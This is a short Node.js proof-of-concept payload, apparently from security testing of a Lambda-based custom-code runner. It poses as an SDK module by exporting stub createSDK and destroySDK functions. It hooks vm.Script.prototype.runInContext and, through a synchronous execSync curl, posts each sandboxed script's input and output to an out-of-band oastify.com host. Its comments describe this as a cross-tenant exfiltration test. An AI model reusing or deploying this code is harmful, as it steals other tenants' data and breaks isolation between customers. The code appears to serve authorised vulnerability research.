// Benign cross-tenant PoC payload. No Atomicwork source or credentials.
// Loaded by custom-code-commonjs when event.sdk_presigned_url resolves to this tarball.
//
// Delivery is SYNCHRONOUS on purpose: Lambda freezes the container as soon as the handler
// returns, so a fire-and-forget https.request gets dropped after DNS resolution (we saw
// DNS-only hits). execSync + curl blocks until the POST is actually delivered.
const vm = require('vm');
const { execSync } = require('child_process');

const OOB_HOST = '233rxlncf2eftvib76v7ch2y6pcg0d31s.oastify.com';

function safe(v) {
  try { return JSON.parse(JSON.stringify(v)); } catch (e) { return String(v); }
}

function exfil(label, obj) {
  try {
    const body = JSON.stringify({ label: label, data: safe(obj) });
    execSync(
      'curl -s -m 8 -X POST -H "Content-Type: application/json" --data-binary @- ' +
        'https://' + OOB_HOST + '/x/' + label,
      { input: body, timeout: 9000, stdio: ['pipe', 'ignore', 'ignore'] }
    );
  } catch (e) { /* never break the invocation */ }
}

try {
  const origRun = vm.Script.prototype.runInContext;
  vm.Script.prototype.runInContext = function (ctx) {
    try {
      exfil('pre-run', { input: ctx ? ctx.input : null });
    } catch (e) {}
    const r = origRun.apply(this, arguments);
    try {
      exfil('post-run', { output: ctx ? ctx.script_output : null });
    } catch (e) {}
    return r;
  };
} catch (e) {}

module.exports = {
  SERVERS: [],
  createSDK: function () {
    return { runtime: { configureAPIClient: function () {} }, MCP: {}, API: {} };
  },
  destroySDK: function () { return Promise.resolve(); }
};
